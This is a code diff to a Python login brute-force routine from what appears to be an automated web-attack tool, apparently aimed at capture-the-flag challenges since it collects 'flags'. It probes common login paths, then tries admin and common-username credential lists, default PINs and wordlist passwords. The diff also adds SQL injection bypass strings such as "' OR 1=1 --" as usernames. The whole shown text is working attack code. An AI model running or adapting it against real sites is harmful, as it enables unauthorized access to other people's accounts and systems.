@@ -174,24 +174,24 @@ def run_login_brute(base, page_html, full_pin=False, workers=16):
 
     for target, fields, method in _find_login_forms(base, page_html):
         targets.append((target, fields, method))
-    # probe common login endpoints (no form on the homepage)
+    # probe common login endpoints ONLY if no form found on homepage
     probed = set()
-    for p in LOGIN_PATHS:
-        url = base + p
-        r = httpx.get(url, timeout=6)
-        if r is None or r.status in (404, 500):
-            continue
-        forms = _find_login_forms(base + p, r.text)
-        if forms:
-            for f in forms:
-                if f[0] not in probed:
-                    probed.add(f[0])
-                    targets.append(f)
-        elif r.status == 200 and ("password" in r.text.lower() or
-                                  "login" in r.text.lower()):
-            probed.add(url)
-            # JSON-ish login endpoint: fields guessed as username/password
-            targets.append((url, [("username", "text"), ("password", "password")], "post"))
+    if not targets:  # only probe if we didn't find a form already
+        for p in LOGIN_PATHS:
+            url = base + p
+            r = httpx.get(url, timeout=6)
+            if r is None or r.status in (404, 500):
+                continue
+            forms = _find_login_forms(base + p, r.text)
+            if forms:
+                for f in forms:
+                    if f[0] not in probed:
+                        probed.add(f[0])
+                        targets.append(f)
+            elif r.status == 200 and ("password" in r.text.lower() or
+                                      "login" in r.text.lower()):
+                probed.add(url)
+                targets.append((url, [("username", "text"), ("password", "password")], "post"))
 
     if not targets:
         return findings, flags
@@ -207,20 +207,24 @@ def run_login_brute(base, page_html, full_pin=False, workers=16):
         hint = PIN_HINT_RE.search(target) or (
             baseline and PIN_HINT_RE.search(baseline.text))
         creds = []
-        for u in USERNAMES:
-            for p in COMMON_PASSWORDS:
-                creds.append((u, p))
+        # top combos first: admin×common + common×admin
+        for p in COMMON_PASSWORDS[:15]:
+            creds.append(("admin", p))
+        for u in USERNAMES[:5]:
+            creds.append((u, "admin"))
+            creds.append((u, "password"))
         # default-username × top pins
         if hint or full_pin:
             for pin in COMMON_PINS:
                 creds.append(("admin", pin))
-                creds.append(("NCSA", pin))
-                creds.append(("root", pin))
-        # wordlist passwords (cheap additions after common ones)
+        # SQL injection payloads on login form
+        for sqli_user in ["' OR 1=1 --", "admin' OR '1'='1", "' OR '1'='1' --",
+                          "admin' --", "' OR ''='"]:
+            creds.append((sqli_user, "anything"))
+        # wordlist passwords (limited for speed)
         wordlist = _load_wordlist_passwords()
-        for u in USERNAMES[:8]:
-            for p in wordlist[:80]:
-                creds.append((u, p))
+        for p in wordlist[:30]:
+            creds.append(("admin", p))
         if _try_creds(target, fields, method, creds, base_fp,
                       local_find, local_flags):
             return local_find, local_flags
